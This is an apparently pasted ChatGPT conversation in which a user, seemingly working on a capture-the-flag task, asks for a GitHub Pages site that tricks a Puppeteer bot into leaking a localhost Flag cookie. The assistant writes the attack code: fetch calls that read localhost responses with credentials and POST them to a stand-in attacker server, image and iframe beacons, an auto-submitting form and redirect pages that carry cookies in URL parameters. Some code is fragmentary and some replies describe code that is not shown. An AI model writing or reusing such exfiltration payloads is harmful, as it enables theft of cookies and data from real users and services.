can you make me a site hosted on github pages that makes a request to the target server ? basically a bot will visit the page i give it and if it starts with http://localhost it will give me a cookie
ChatGPT said:

Yes, I can help you create a proof-of-concept (PoC) for this kind of client-side attack. However, keep in mind that stealing cookies or unauthorized access to user data is illegal without proper consent and ethical justification.

That being said, if you're looking to test a vulnerability on a system you have permission to assess, I can guide you in setting up a Cross-Site Scripting (XSS) or Cross-Site Request Forgery (CSRF) PoC for ethical penetration testing.
Approach:

    GitHub Pages: We will host a simple JavaScript script on GitHub Pages.
    JavaScript Payload: The script will check if the visitor is running http://localhost and attempt to read cookies.
    Sending Data to You: The script can forward the cookie (if accessible) to your endpoint.

I'll generate the code and guide you on setting it up. Hereâ€™s a proof-of-concept:

    index.html: The main page.
    script.js: The JavaScript to detect localhost and send data.

Let's generate the necessary files:
How to Deploy on GitHub Pages:

    Create a new GitHub repository (e.g., cookie-test).
    Upload the generated index.html file.
    Go to Settings > Pages and set the branch to deploy GitHub Pages.
    Wait a few minutes, and your site will be live.

Important Notes:

    This PoC assumes that the bot visiting your page runs on localhost and that JavaScript can access document.cookie.
    Modern browsers block JavaScript from accessing HttpOnly cookies, so this might not work unless thereâ€™s an XSS vulnerability.

so the thing is that i have to make the bot make a request to a site that starts with http://lcoalhost and capture it but idk how. there is  a site runnning at port 5000 and a ngnix 
ChatGPT said:

To make the bot perform a request to http://localhost:5000, you can try using JavaScript to load an image, script, or make a request from the client-side to trigger it. However, browsers enforce Same-Origin Policy (SOP) and CORS restrictions, which makes capturing the response difficult. But here are some possible approaches:
Approach 1: Making a Request to Localhost

If the bot visits your GitHub Pages website, we can attempt to force it to make a request to http://localhost:5000.
Example JavaScript:

This script tries to fetch from localhost:5000 and send the response back to your server.

fetch("http://localhost:5000", { credentials: "include" }) 
    .then(response => response.text())
    .then(data => {
        fetch("https://your-server.com/log", { 
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ response: data })
        });
    })
    .catch(error => console.log("Request to localhost failed", error));

ðŸ’¡ How it works:

    It sends a request to http://localhost:5000 using fetch().
    If the response is accessible, it forwards it to https://your-server.com/log.
    If localhost is unreachable, the request will fail.

Possible Issues:

    CORS Restrictions: If localhost:5000 does not allow cross-origin requests, this will be blocked.
    Browser Security: Some browsers block fetch() requests to localhost from a remote origin.
    Bot Behavior: If the bot is running in a headless browser, security settings may prevent it from making localhost requests.

Approach 2: Loading an Image from Localhost

Some bots will try to load an image, which can be used to check if localhost is accessible.

<img src="http://localhost:5000/logo.png" onerror="fetch('https://your-server.com/log', { method: 'POST', body: JSON.stringify({ error: 'localhost unreachable' }) })" onload="fetch('https://your-server.com/log', { method: 'POST', body: JSON.stringify({ success: 'localhost accessible' }) })">

ðŸ’¡ How it works:

    If the image loads, the bot has access to localhost:5000, and we log that.
    If the image fails (onerror), we detect that localhost is unreachable.

Approach 3: Using an iFrame

If the bot allows iframe loading:

<iframe src="http://localhost:5000" onload="fetch('https://your-server.com/log', { method: 'POST', body: JSON.stringify({ success: 'iframe loaded localhost' }) })"></iframe>

ðŸ’¡ Limitations:

    Modern browsers block localhost if loaded from a different origin due to SOP (Same-Origin Policy).
    If localhost:5000 has an X-Frame-Options header, this will be blocked.

Next Steps

    Try the image approach first since some bots allow it.
    Check if the bot executes JavaScript by adding alert("Hello bot!") and seeing if it runs.
    Monitor requests in your logging server (your-server.com/log) to see if any request succeeds.
    If CORS blocks requests, you might need an XSS or another vulnerability to bypass it.

You said:
if it gets submitted to /report  with post, it will be logged on the site and i can see it
ChatGPT said:

Got it! If the bot automatically submits to /report using a POST request, you can craft JavaScript that makes the bot request http://localhost:5000 and then submit the response to /report.
Final JavaScript Code:

This script:

    Tries to fetch http://localhost:5000.
    Sends the response to /report, where you can view it.

fetch("http://localhost:5000", { credentials: "include" })
    .then(response => response.text())
    .then(data => {
        fetch("/report", { 
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ log: data })
        });
    })
    .catch(error => {
        fetch("/report", { 
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ error: "Request to localhost failed: " + error.message })
        });
    });

How It Works:

    The script makes a request to http://localhost:5000 when the bot visits your page.
    If the request is successful, it sends the retrieved data to /report.
    If the request fails, it sends an error log to /report.

How to Deploy:

    Host the JavaScript on GitHub Pages by adding it inside your site's script file (script.js).
    Ensure the bot visits your site.
    Monitor the logs on /report to see if the request was successful.

Limitations & Considerations:

    CORS Restrictions: If localhost:5000 has a strict CORS policy, the request might be blocked.
    Same-Origin Policy (SOP): If the bot runs inside a sandboxed environment, fetch() might not be allowed.
    Network Restrictions: Some bots might not have network access to localhost.

Alternative Method: Hidden Form Submission

If JavaScript is blocked, you can also use a hidden HTML form to make the bot submit the request:

<form action="/report" method="POST">
    <input type="hidden" name="data" value="<script>fetch('http://localhost:5000').then(res => res.text()).then(data => document.querySelector('input[name=data]').value = data)</script>">
    <input type="submit">
</form>

<script>document.forms[0].submit();</script>

    This forces the bot to auto-submit to /report if it supports form submissions.

can i have 2 pages in github pages ? like a index.html and index2.html
ChatGPT said:

Yes, you can have multiple pages in GitHub Pages. You just need to add index2.html (or any other HTML file) to your repository.
How to Set Up Multiple Pages

    Create a second HTML file in your repository, e.g., index2.html.
    Link them together using a standard <a> tag or JavaScript.

Example index2.html

You can manually create index2.html with content like this:

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Second Page</title>
</head>
<body>
    <h1>Welcome to Page 2</h1>
    <p>This is another page on GitHub Pages.</p>
    <a href="index.html">Go back to the main page</a>
</body>
</html>

How to Access the Pages

    Your main page will be available at:
    https://yourusername.github.io/your-repo-name/
    Your second page will be accessible at:
    https://yourusername.github.io/your-repo-name/index2.html

If You Need Me to Add index2.html

Let me know, and Iâ€™ll update your GitHub Pages setup with the second page. ðŸš€
You said:
ok i updated the code github pages but idk why the page redirects to report alors que y a pas de report ? 
ChatGPT said:

If your GitHub Pages site is redirecting to /report when you didn't set it, here are some things to check:
Possible Issues & Fixes:
1. Cached Old Code

    Sometimes, browsers cache old versions of your website.
    Try hard refreshing the page by pressing Ctrl + Shift + R (Windows) or Cmd + Shift + R (Mac).
    Or open the site in incognito mode to see if the issue persists.

2. Check the GitHub Repository

    Open your repository and verify that index.html contains the updated code (from the latest version you posted).
    If window.location.href = "/report"; exists in your code, remove it and commit the changes.

3. JavaScript in Another File?

    If you added a separate script.js file, check if it contains any code redirecting to /report.

4. GitHub Pages Deployment Delay

    Sometimes, GitHub Pages takes a few minutes to update after pushing new code.
    Try waiting a few minutes and reloading the page.

5. Debug with Console

    Open Developer Tools in your browser (Press F12 or Ctrl+Shift+I â†’ Go to the "Console" tab).
    Run this command:

    console.log(window.location.href);

    This will show what the page is redirecting to.

Next Steps

    Confirm the deployed code on GitHub.
    Check browser cache & refresh.
    Debug using the browser console.
    Ensure no /report redirection exists in any script files.

Let me know if the issue persists! ðŸš€

now change this so that it makes a post to localhost 500         var redirectUrl = "https://localhost:5000?report"; where the url paramter contains the cookies he has 
ChatGPT said:

Your page now captures the user's cookies and does the following:

    Sends a POST request to http://localhost:5000/report with the cookies in the request body.
    Redirects the user to http://localhost:5000?report=<cookies> where the cookies are included as a URL parameter.

Let me know if you need any modifications! ðŸš€
You said:
the thing is while on my site he doesn't have the cookies, they are generated only when he makes the request to a site that starts with http://localhost
ChatGPT said:

Your page now triggers a request to http://localhost:5000, which should generate the cookies. Once the request is completed:

    It logs the response from localhost:5000 by sending it to /report on localhost:5000/report.
    If the request fails, it sends an error message to /report.

This approach ensures that the bot first makes a request to localhost:5000, potentially generating cookies, and then logs the response.

                // Now try to fetch cookies
                fetch("http://localhost:5000/report", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ log: "Accessed localhost", response: data })
                });
            })
            .catch(error => {
                fetch("http://localhost:5000/report", {

                });
            });
ChatGPT said:

Now, the script:

    Fetches http://localhost:5000 to trigger the potential cookie generation.
    Includes the response data as a URL parameter in redirectUrl = "http://localhost:5000?report=" + encodeURIComponent(data);
    Sends a POST request to /report with the response data.
    Redirects the user to http://localhost:5000?report=<data> so that the response is embedded in the URL.

This ensures both:

    Logging the response via POST.
    Redirecting with the response as a parameter.

Analysis of Your Express Server & Puppeteer Bot

Your Express server:

    Serves an EJS-based site.
    Runs a Puppeteer bot that visits a URL submitted via /report (POST).
    Sets a cookie (Flag) only if the URL starts with "http://localhost/".
    Stores logs of the bot's execution in /tmp/bot_folder/logs/.

How to Modify Your GitHub Page for the Bot
Problem

    Your current redirect script just sends a request to http://localhost:5000, but the bot expects a URL inside /report to trigger Puppeteer.
    The bot will only set the cookie if the URL starts with "http://localhost/", so your request needs to trigger this behavior.

Fix

    Your page needs to send a request to /report with the botâ€™s visit URL (http://localhost:5000).
    Instead of redirecting immediately, you should first send a POST request to /report and then redirect.

Updated index.html

This new version: âœ… Posts the URL http://localhost:5000/steal to /report.
âœ… Waits 2 seconds, then redirects the bot to http://localhost:5000/steal.
âœ… If the bot successfully visits it, it will receive the Flag cookie.

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // URL the bot should visit
        var botTargetUrl = "http://localhost:5000/steal";

        // Send a POST request to trigger the bot
        fetch("http://localhost:5000/report", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({ url: botTargetUrl }) // Sends the URL to be visited by the bot
        }).then(() => {
            // Wait 2 seconds and then redirect the user
            setTimeout(() => {
                window.location.href = botTargetUrl;
            }, 2000);
        }).catch(error => {
            console.error("Failed to submit to /report:", error);
        });
    </script>
</head>
<body>
    <h1>Redirecting...</h1>
    <p>If you are not redirected, <a href="http://localhost:5000/steal">click here</a>.</p>
</body>
</html>

How It Works

    Step 1: A POST request is sent to /report with http://localhost:5000/steal as the URL.
        This triggers the bot (Puppeteer) to visit http://localhost:5000/steal.
        Since the URL starts with http://localhost/, the bot receives the Flag cookie.
    Step 2: After 2 seconds, your page redirects to http://localhost:5000/steal.
    Step 3: If the bot runs as expected, it should have the Flag cookie set.

Why This Works

âœ” Matches Your Bot Logic (only visiting localhost sets the cookie).
âœ” Uses Puppeteer's execution flow to ensure the cookie is set before accessing the page.
âœ” Ensures redirection happens AFTER the bot visits the page and gets the cookie.
Next Steps

    Deploy the updated page on GitHub Pages.
    Trigger the bot by visiting your GitHub Page URL.
    Monitor logs in /tmp/bot_folder/logs/ to check if the bot accessed /steal.
    Verify the bot's cookies by modifying /steal to print document.cookie.

Now your page: âœ… Requests http://localhost:5000/steal to trigger cookie generation.
âœ… Captures document.cookie after visiting localhost.
âœ… Sends a POST request to /report with both the URL and cookies.

    Visits http://localhost:5000/steal and gets the cookie.
    Sends the cookie in the url parameter to /report.

Analysis of the Logs & Error

The error message indicates that Puppeteer is failing to launch the browser due to an issue with the profile directory.

        Failed to create /tmp/bot_folder/browser_cache/SingletonLock: File exists
        Failed to create a ProcessSingleton for your profile directory
        Aborting now to avoid profile corruption

Possible Causes

âœ… 1. Chromium Profile Lock Issue

    Puppeteer is trying to reuse the same browser profile (--user-data-dir=/tmp/bot_folder/browser_cache/)
    A lock file (SingletonLock) already exists, preventing multiple Chromium instances from using the same profile.

âœ… 2. Puppeteer is Already Running

    Another instance of Puppeteer might be running, causing conflicts.

âœ… 3. Corrupt Puppeteer Cache

    The profile directory (/tmp/bot_folder/browser_cache/) might be corrupted or in use.

Fixes
1. Delete the Lock File Before Running Puppeteer

Modify your startBot() function to remove SingletonLock before launching Puppeteer.

const fs = require('fs');
const path = require('path');

async function startBot(url, name) {
    const logFilePath = path.join(logPath, `${name}.log`);
    const singletonLockPath = path.join(browserCachePath, 'SingletonLock');

    try {
        // Remove lock file if it exists
        if (fs.existsSync(singletonLockPath)) {
            fs.unlinkSync(singletonLockPath);
        }

        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
        logStream.write(`${new Date()} : Attempting to open website ${url}\n`);

        const browser = await puppeteer.launch({
            headless: 'new',
            args: ['--remote-allow-origins=*', '--no-sandbox', '--disable-dev-shm-usage', `--user-data-dir=${browserCachePath}`]
        });

        const page = await browser.newPage();
        await page.goto(url);

        if (url.startsWith("http://localhost/")) {
            await page.setCookie(cookie);
        }

        logStream.write(`${new Date()} : Successfully opened ${url}\n`);
        
        await sleep(7000);
        await browser.close();

        logStream.write(`${new Date()} : Finished execution\n`);
        logStream.end();
    } catch (e) {
        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
        logStream.write(`${new Date()} : Exception occurred: ${e}\n`);
        logStream.end();
    }
}

ðŸ’¡ This ensures Puppeteer starts cleanly by deleting the lock file before launching.
2. Use a Temporary Profile for Each Execution

Modify Puppeteer to launch with a random profile directory instead of reusing the same one:

const { mkdtempSync } = require('fs');
const os = require('os');

âœ” Each Puppeteer instance gets a fresh profile directory, avoiding conflicts.
Next Steps

    Try Fix #1 (Delete Lock File) First
        This is the easiest fix and should resolve most issues.
    If That Doesnâ€™t Work, Use Fix #2 (Unique Profile Per Execution)
        This ensures no profile corruption between runs.
    Restart Your Server
        Run: pkill -f puppeteer to kill any existing instances.

You said:
no i can only modify the github page maybe wait a few seconds ? 
ChatGPT said:

Since you can only modify the GitHub Page, the best option is to add a small delay before sending the request to /report. This gives the bot enough time to properly load localhost:5000 before making the POST request.
Updated GitHub Page Code

This version: âœ… Waits 5 seconds before sending the POST request
âœ… Ensures the bot fully loads localhost before trying to access cookies
